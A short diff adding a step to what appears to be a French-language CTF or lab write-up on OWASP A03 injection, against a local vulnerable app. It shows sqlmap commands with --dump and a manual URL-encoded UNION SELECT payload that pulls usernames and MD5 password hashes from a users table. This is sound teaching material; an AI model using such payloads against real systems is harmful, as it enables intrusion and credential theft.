@@ -53,6 +53,11 @@ sqlmap -u "http://localhost:8042/A03.php?username=admin"
 sqlmap -u "http://localhost:8042/A03.php?username=admin" --dump
 ```
 
+Nous pouvons aussi tester avec des injections manuelles :
+```sql
+http://localhost:8042/A03.php?username=admi%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71786b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x6176666d7877%2Cid%2Cmd5_password%2Cusername%29%29%2C0x717a767171%29%2CNULL%20FROM%20vulnerable_app.users--%20-
+```
+
 Nous obtenons le flag.
 
 ## A04 - Conception non sécurisée
